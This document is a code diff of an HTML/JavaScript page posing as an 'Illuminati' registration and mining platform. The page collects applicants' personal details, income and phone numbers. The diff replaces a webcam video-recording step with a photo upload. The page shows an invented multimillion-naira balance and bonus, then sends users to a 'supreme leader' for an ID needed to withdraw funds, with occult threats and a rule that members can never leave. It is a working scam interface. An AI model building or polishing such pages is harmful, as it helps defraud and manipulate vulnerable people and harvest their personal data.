@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Illuminati Platform</title>
+    <title>Global Mining Platform</title>
     <style>
         :root {
             --bg-deep: #070d1b;
@@ -46,13 +46,10 @@
         .rule-item { font-size: 14px; line-height: 1.5; color: var(--text-main); }
         .rule-item strong { color: var(--accent-blue); }
 
-        /* Video Teleprompter Recording Screen */
-        .teleprompter-box { background: rgba(0,0,0,0.6); border: 1px solid #2563eb55; border-radius: 12px; height: 100px; overflow: hidden; position: relative; margin-bottom: 16px; padding: 15px; text-align: center; display: flex; align-items: center; justify-content: center; }
-        .scrolling-text { position: absolute; width: 100%; font-size: 20px; font-weight: 800; color: #ffffff; text-shadow: 0 2px 4px rgba(0,0,0,0.8); animation: scrollUp 8s linear infinite; }
-        @keyframes scrollUp { 0% { transform: translateY(50px); opacity: 0; } 15% { opacity: 1; } 85% { opacity: 1; } 100% { transform: translateY(-70px); opacity: 0; } }
-
-        .camera-preview-container { width: 100%; height: 230px; background: #000; border-radius: 14px; overflow: hidden; position: relative; margin-bottom: 16px; border: 1px solid #334155; display: flex; align-items: center; justify-content: center; }
-        #webcamVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #070d1b; }
+        /* Picture Upload Styling */
+        .upload-dropzone { border: 2px dashed #2563eb55; background: var(--bg-input); border-radius: 14px; padding: 30px; text-align: center; cursor: pointer; margin-bottom: 20px; transition: border 0.2s; }
+        .upload-dropzone:hover { border-color: var(--accent-blue); }
+        #imagePreview { width: 120px; height: 120px; border-radius: 50%; object-fit: cover; margin: 0 auto 12px auto; display: none; border: 2px solid var(--accent-blue); }
 
         /* Dashboard Screen */
         .dash-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
@@ -99,7 +96,7 @@
 
     <!-- STEP 1: ONLINE REGISTRATION FORM -->
     <div id="screenRegistration" class="screen">
-        <h2 style="font-size: 20px; margin-bottom: 4px;">THE ILLUMINATI ONLINE REGISTRATION FORM.</h2>
+        <h2 style="font-size: 20px; margin-bottom: 4px;">🔯THE ILLUMINATI ONLINE REGISTRATION FORM.🔺</h2>
         <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 20px;">The Illuminati is an organization committed to empowering individuals worldwide. We focus on security, prosperity, and helping members achieve financial success and fame without harm or deception.</p>
 
         <div class="input-group">
@@ -141,11 +138,11 @@
         </div>
         <div class="input-group">
             <label>Occupation/Job</label>
-            <input type="text" id="regOccupation" placeholder="what you do for living">
+            <input type="text" id="regOccupation" placeholder="what you do for a living">
         </div>
         <div class="input-group">
             <label>Monthly Income (₦)</label>
-            <input type="text" id="regIncome" placeholder="how much to you make montly" inputmode="numeric">
+            <input type="text" id="regIncome" placeholder="how much do you make monthly" inputmode="numeric">
         </div>
         <div class="input-group">
             <label>Mobile Number</label>
@@ -172,20 +169,39 @@
 
     <!-- STEP 3: RULES & AGREEMENT -->
     <div id="screenRules" class="screen">
-        <h2 style="font-size: 20px; margin-bottom: 10px;">Platform Rules</h2>
+        <h2 style="font-size: 20px; margin-bottom: 10px;">THE MOST DANGEROUS RULES SIGN🙏🙏 BY THE SUPREME GRAND LODGE🔺🔺🔺👁</h2>
         
         <div class="rules-list">
             <div class="rule-item"><strong>1.</strong> Keep our meeting temple a secret.</div>
-            <div class="rule-item"><strong>2.</strong> Do not directly help anyone above the age 50 Financially.</div>
+            <div class="rule-item"><strong>2.</strong> Do not help anyone above the age 50 Financially.</div>
             <div class="rule-item"><strong>3.</strong> Fight to keep the society in peace and order.</div>
             <div class="rule-item"><strong>4.</strong> Once you have taken the oath and become a member there is no going back, you can’t leave the brotherhood.</div>
             <div class="rule-item"><strong>5.</strong> Do not sex with any girl on the 9th of every month.</div>
-            <div class="rule-item"><strong>6.</strong> Do not sex a day before coming to the temple.</div>
+            <div class="rule-item"><strong>6.</strong> you are not expected sex a day before coming to the temple.</div>
             <div class="rule-item"><strong>7.</strong> you are expected to call you supreme leader (Master or father).</div>
         </div>
 
         <p style="font-size: 14px; font-weight: bold; margin-top: 10px; margin-bottom: 10px; text-align: center;">Do you agree with these terms and conditions?</p>
         <button class="btn" onclick="acceptRules()">I Agree</button>
+    </div>
+
+    <!-- STEP 4: PICTURE UPLOAD SCREEN -->
+    <div id="screenUpload" class="screen">
+        <h2 style="font-size: 20px; margin-bottom: 4px;">Profile Picture Verification</h2>
+        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 20px;">Please upload a clear picture of yourself to complete verification.</p>
+
+        <div class="upload-dropzone" onclick="document.getElementById('fileInput').click()">
+            <img id="imagePreview" alt="Preview">
+            <div id="uploadPlaceholder">
+                <span style="font-size: 32px; display: block; margin-bottom: 8px;">📷</span>
+                <p style="font-size: 14px; font-weight: bold; color: var(--text-main);">Click to upload your picture</p>
+                <p style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">Supports JPG, PNG</p>
+            </div>
+        </div>
+        <input type="file" id="fileInput" accept="image/*" style="display: none;" onchange="handleImageUpload(event)">
+
+        <p id="uploadError" class="error-text" style="margin-bottom: 10px;"></p>
+        <button class="btn" id="submitUploadBtn" onclick="submitPicture()" disabled style="opacity: 0.5;">Proceed to Dashboard</button>
     </div>
 
     <!-- STEP 5: DASHBOARD SCREEN -->
@@ -233,17 +249,17 @@
     <div id="adminNoticeModal" class="id-modal">
         <div class="id-modal-content">
             <div style="font-size: 32px; margin-bottom: 6px;">ℹ️</div>
-            <h3 style="font-size: 18px; margin-bottom: 8px;">Admin Clearance Required</h3>
-            <p style="color: var(--text-muted); font-size: 12px;">Please contact your supreme leader to get your membership ID and other items:</p>
+            <h3 style="font-size: 18px; margin-bottom: 8px;">Clearance Required</h3>
+            <p style="color: var(--text-muted); font-size: 12px;">Please contact the supreme leader that gave you this link to get your membership ID and your other items:</p>
             
             <div class="admin-req-list">
                 1. Membership registration ID Number that you can use to withdraw your money<br>
                 2. Illuminati uniform<br>
                 3. The Illuminati ring 💍<br>
-                4. Protection oil "rub it first of every year. (this will protect you against the devil curse, it will protect you from the god of death because after taken the oath your soul now belongs to the devil)
+                4. Protection oil rub it first of every year. (this will protect you against the devil curse, it will protect you from the god of death because after taken the oath your soul now belongs to the devil)
             </div>
 
-            <p style="font-size: 12px; color: var(--accent-blue); margin-bottom: 16px;">If you already have taken all these items from your supreme leader, you can click on the proceed button below to proceed.</p>
+            <p style="font-size: 12px; color: var(--accent-blue); margin-bottom: 16px;">If you already have taken all these details from your supreme leader, you can click on the proceed button below to proceed.</p>
 
             <div style="display: flex; gap: 10px;">
                 <button class="btn btn-secondary" onclick="closeAdminNoticeModal()">Cancel</button>
@@ -328,10 +344,10 @@
 </div>
 
 <script>
-    const STORAGE_KEY_STEP = "vault_registration_step_v4";
-    const STORAGE_KEY_BONUS_CLAIMED = "vault_bonus_claimed_v4";
-    const STORAGE_KEY_BALANCE = "vault_balance_v4";
-    const STORAGE_KEY_TIME = "vault_last_time_v4";
+    const STORAGE_KEY_STEP = "vault_registration_step_v5";
+    const STORAGE_KEY_BONUS_CLAIMED = "vault_bonus_claimed_v5";
+    const STORAGE_KEY_BALANCE = "vault_balance_v5";
+    const STORAGE_KEY_TIME = "vault_last_time_v5";
 
     const BASE_BALANCE = 12900000.00;
     const BONUS_AMOUNT = 6200472.00;
@@ -339,6 +355,7 @@
 
     let currentBalance = BASE_BALANCE;
     let tickerInterval = null;
+    let pictureUploaded = false;
 
     // Populate Age Scroll Options (18 to 100)
     window.addEventListener('DOMContentLoaded', () => {
@@ -360,10 +377,7 @@
         if (stepName === 'registration') document.getElementById('screenRegistration').classList.add('active');
         if (stepName === 'service') document.getElementById('screenService').classList.add('active');
         if (stepName === 'rules') document.getElementById('screenRules').classList.add('active');
-        if (stepName === 'video') {
-            document.getElementById('screenVideo').classList.add('active');
-            initCamera();
-        }
+        if (stepName === 'upload') document.getElementById('screenUpload').classList.add('active');
         if (stepName === 'dashboard') {
             document.getElementById('dashScreen').classList.add('active');
             const savedName = localStorage.getItem('user_profile_name') || 'User';
@@ -420,43 +434,39 @@
     }
 
     function acceptRules() {
-        setScreenStep('video');
+        setScreenStep('upload');
     }
 
-    let mediaStream = null;
-    async function initCamera() {
-        try {
-            mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            const videoElem = document.getElementById('webcamVideo');
-            videoElem.srcObject = mediaStream;
-            await videoElem.play();
-        } catch(e) {
-            console.log('Camera initialization preview:', e);
-        }
-    }
-
-    let isRecordingState = false;
-    function toggleRecording() {
-        const btn = document.getElementById('recordBtn');
-        const restartBtn = document.getElementById('restartBtn');
-        
-        if(!isRecordingState) {
-            isRecordingState = true;
-            btn.innerText = "Stop & Submit Recording";
-            restartBtn.style.display = 'block';
-        } else {
-            if(mediaStream) {
-                mediaStream.getTracks().forEach(track => track.stop());
+    // Picture Upload Handling
+    function handleImageUpload(event) {
+        const file = event.target.files[0];
+        const errBox = document.getElementById('uploadError');
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const preview = document.getElementById('imagePreview');
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+                document.getElementById('uploadPlaceholder').style.display = 'none';
+                
+                pictureUploaded = true;
+                const submitBtn = document.getElementById('submitUploadBtn');
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                errBox.style.display = 'none';
             }
-            setScreenStep('dashboard');
+            reader.readAsDataURL(file);
         }
     }
 
-    function restartRecording() {
-        isRecordingState = false;
-        document.getElementById('recordBtn').innerText = "Start Recording";
-        document.getElementById('restartBtn').style.display = 'none';
-        initCamera();
+    function submitPicture() {
+        if(!pictureUploaded) {
+            const errBox = document.getElementById('uploadError');
+            errBox.innerText = "Please upload your picture before proceeding.";
+            errBox.style.display = 'block';
+            return;
+        }
+        setScreenStep('dashboard');
     }
 
     // Welcome Bonus Management
